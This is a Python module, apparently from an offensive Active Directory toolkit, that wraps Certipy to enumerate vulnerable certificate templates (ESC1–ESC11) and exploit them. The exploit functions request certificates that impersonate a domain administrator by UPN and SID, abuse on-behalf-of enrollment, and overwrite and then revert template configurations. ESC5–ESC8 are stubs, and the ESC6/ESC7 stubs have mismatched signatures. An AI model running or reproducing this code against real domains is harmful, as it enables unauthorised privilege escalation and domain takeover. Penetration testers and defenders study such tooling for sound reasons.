# modules/ad_certipy.py
import os
import subprocess
import glob
import shutil
from datetime import datetime
from general_utils import log_command, current_date
import re

def describe_esc(esc):
    descriptions = {
        "ESC1:": f"\033[91mEnrollee supplies subject and template allows client authentication.\033[0m",
        "ESC2:": f"\033[91mTemplate can be used for any purpose.\033[0m",
        "ESC3:": f"\033[91mTemplate has Certificate Request Agent EKU set.\033[0m",
        "ESC4:": f"\033[91mUser has enrollment rights and SAN control (e.g., spoof DC).\033[0m",
        "ESC5:": f"\033[91muser can modify certificate template access control lists (e.g., Role Based Constrained Delegation RBCD)\033[0m",
        "ESC6:": f"\033[91mVulnerable if EDITF_ATTRIBUTESUBJECTALTNAME2 flag is set (patched in May 2022 due to CVE-2022-26923)\033[0m",
        "ESC7:": f"\033[91mVulnerable if EDITF_ATTRIBUTESUBJECTALTNAME2 can be modified (need administrator CA rights or ManageCA rights over CA)\033[0m",
        "ESC8:": f"\033[91mVulnerable web enrollment endpoint anbd at least one certificate template enabled that allows domain computer enrollment and client authentication\033[0m",
        "ESC9:": f"\033[91mDangerous permissions allow tampering with template ACLs.\033[0m",
        "ESC10:": f"\033[91mAbuses StrongCertificateBindingEnforcement or CertificateMappingMethods registry keys and spoofs UPN\033[0m",
        "ESC11:": f"\033[91mAbuses IF_ENFORCEENCRYPTICERTREQUEST between client and CA\033[0m"
    }
    return descriptions.get(esc, "Unknown vulnerability.")
    
def run_certipy_find(args):
    required_args = [args.domain_user, args.domain_pass, args.domain, args.dc_ip]
    if not all(required_args):
        print("[-] Certipy requirements not met: missing username, password, domain, or dc-ip.")
        return

    user_at_domain = f"{args.domain_user}@{args.domain}"
    cmd = f"certipy.pyz find -enabled -u {user_at_domain} -p {args.domain_pass} -dc-ip {args.dc_ip} -stdout | tee ActiveDirectory/ADCS/{current_date}_FindResults.txt"
    start = datetime.now()
    print(f"\033[92m[*] Running: {cmd}\033[0m")
    result = subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    end = datetime.now()
    log_command(cmd, start, end, args.dc_ip, "Success" if result.returncode == 0 else "Failed")

def find_esc_vulns(certipy_dir):
    certipy_dir = os.path.expanduser(certipy_dir)
    esc_vulns = []

    for root, _, files in os.walk(certipy_dir):
        for file in files:
            if file.endswith(".txt"):
                file_path = os.path.join(root, file)
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    lines = f.readlines()

                current_ca = None
                current_template = None
                current_escs = []

                i = 0
                while i < len(lines):
                    line = lines[i].strip()

                    # Capture CA Name
                    ca_match = re.search(r"CA Name\s*[:=]\s*(.+)", line)
                    if ca_match:
                        current_ca = ca_match.group(1).strip()

                    # Capture Template Name
                    template_match = re.search(r"Template Name\s*[:=]\s*(.+)", line)
                    if template_match:
                        current_template = template_match.group(1).strip()
                        current_escs = []

                    # Parse ESC* vulnerabilities listed in vulnerability blocks
                    if line.startswith("[!] Vulnerabilities") or line.startswith("Vulnerabilities"):
                        j = i + 1
                        while j < len(lines):
                            vuln_line = lines[j].strip()
                            match = re.match(r"^(ESC\d+)", vuln_line)
                            if match:
                                esc = match.group(1)
                                if current_template:
                                    if esc not in current_escs:
                                        esc_vulns.append((esc + ":", current_template, current_ca))
                                        current_escs.append(esc)
                                else:
                                    esc_vulns.append((esc + ":", None, current_ca))
                            elif vuln_line == "" or vuln_line.startswith("Template Name"):
                                break
                            j += 1
                        i = j - 1

                    i += 1

    if not esc_vulns:
        print("\033[91m[-] No ESC1–ESC8 vulnerabilities found.\033[0m")
        return None

    print("\033[92m[+] Vulnerable Templates Detected:\n\033[0m")
    for idx, (esc_type, template, ca) in enumerate(esc_vulns, 1):
        print(f"{idx}. Template: {template or '[N/A]'} | CA: {ca}")
        print(f"  -> {esc_type} {describe_esc(esc_type)}")

    choice = input("\nSelect a template to use (by number): ")
    try:
        selected = esc_vulns[int(choice) - 1]
        print(f"\n\033[94m[Selected Template]\033[0m\n  Type: {selected[0]}\n  Template: {selected[1] or '[N/A]'}\n  CA: {selected[2]}\n")
        return selected
    except (ValueError, IndexError):
        print("\033[91m[-] Invalid selection.\033[0m")
        return None

# === ESC Handlers ===
def handle_ESC1(args, selected_template, selected_admin, target):
    certipy_ESC1(args, selected_template, selected_admin, target)

def handle_ESC2(args, selected_template, selected_admin, target):
    q = input(f"\033[93m[?] ESC2 can be exploited 2 ways: ESC1-style(e), on-behalf-of(o):\033[0m ").lower()
    if q == "e":
        certipy_ESC1(args, selected_template, selected_admin, target)
    elif q == "o":
        certipy_ESC2(args, selected_template, selected_admin, target)

def handle_ESC3(args, selected_template, selected_admin, target):
    certipy_ESC2(args, selected_template, selected_admin, target)

def handle_ESC4(args, selected_template, selected_admin, target):
    certipy_ESC4(args, selected_template, selected_admin, target)

def handle_ESC5(args, selected_template, selected_admin, target):
    certipy_ESC5(args, selected_template, selected_admin, target)

def handle_ESC6(args, selected_template, selected_admin, target):
    certipy_ESC6(args, selected_template, target)

def handle_ESC7(args, selected_template, selected_admin, target):
    certipy_ESC7(args, selected_template, target)

def handle_ESC8(args, selected_template, selected_admin, target):
    certipy_ESC8(args, selected_template, selected_admin, target)


# === ESC Exploits ===
def certipy_ESC1(args, selected_template, selected_admin, target):
    if not selected_template or not selected_admin:
        print("\033[91m[-] Missing template or domain admin. Skipping cert request.\033[0m")
        return

    template_name = selected_template[1]
    ca_name = selected_template[2]
    admin_account, sid = selected_admin.split(":")
    upn = admin_account.strip()
    cmdsid = sid.strip()
    
    command = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -upn {upn} -template {template_name} -ca {ca_name} -target {target} -sid {cmdsid}"
    print(f"\n[*] Requesting certificate using Certipy template '{template_name}' for user '{admin_account.strip()}'...\n")
    print(f"[*] Running: {command}")
    subprocess.run(command, shell=True)

def certipy_ESC2(args, selected_template, selected_admin, target):
    template_name = selected_template[1]
    ca_name = selected_template[2]
    admin_account, sid = selected_admin.split(":")

    esc2_cmd = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -target {target} -template {template_name} -ca {ca_name} -sid {sid.strip()}"
    print(f"\033[96mESC2 attack with: {esc2_cmd}\033[0m")
    subprocess.call(esc2_cmd, shell=True)

    esc2_pfx_cmd = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -target {target} -template user -ca {ca_name} -pfx {args.domain_user}.pfx -on-behalf-of {args.domain}\\{admin_account.strip()} -sid {sid.strip()}"
    print(f"\033[96mRunning {esc2_pfx_cmd}\033[0m")
    subprocess.call(esc2_pfx_cmd, shell=True)

def certipy_ESC4(args, selected_template, selected_admin, target):
    template_name = selected_template[1]
    ca_name = selected_template[2]

    # Overwrite template config
    esc4_write = [
        "certipy.pyz", "template",
        "-u", f"{args.domain_user}@{args.domain}",
        "-p", args.domain_pass,
        "-template", template_name,
        "-target", target,
        "-save-configuration", "ESC4Save",
        "-write-default-configuration",
        "-force"
    ]
    print(f"\033[96mRunning {esc4_write}\033[0m")
    subprocess.call(esc4_write)

    # Run ESC1 against modified template
    certipy_ESC1(args, selected_template, selected_admin, target)

    # Revert config
    esc4_revert = f"certipy.pyz template -u {args.domain_user}@{args.domain} -p {args.domain_pass} -dc-ip {args.dc_ip} -template {template_name} -write-configuration ESC4Save.json"
    print(f"\033[96mRunning {esc4_revert}\033[0m")
    subprocess.run(esc4_revert, shell=True)

def certipy_ESC5(args, selected_template, selected_admin, target):
    print("[!] ESC5 exploitation not implemented.")

def certipy_ESC6(args, selected_template):
    print("[!] ESC6 exploitation not implemented.", target)

def certipy_ESC7(args, selected_template):
    print("[!] ESC7 exploitation not implemented.", target)

def certipy_ESC8(args, selected_template, selected_admin, target):
    print("[!] ESC8 exploitation not implemented.")
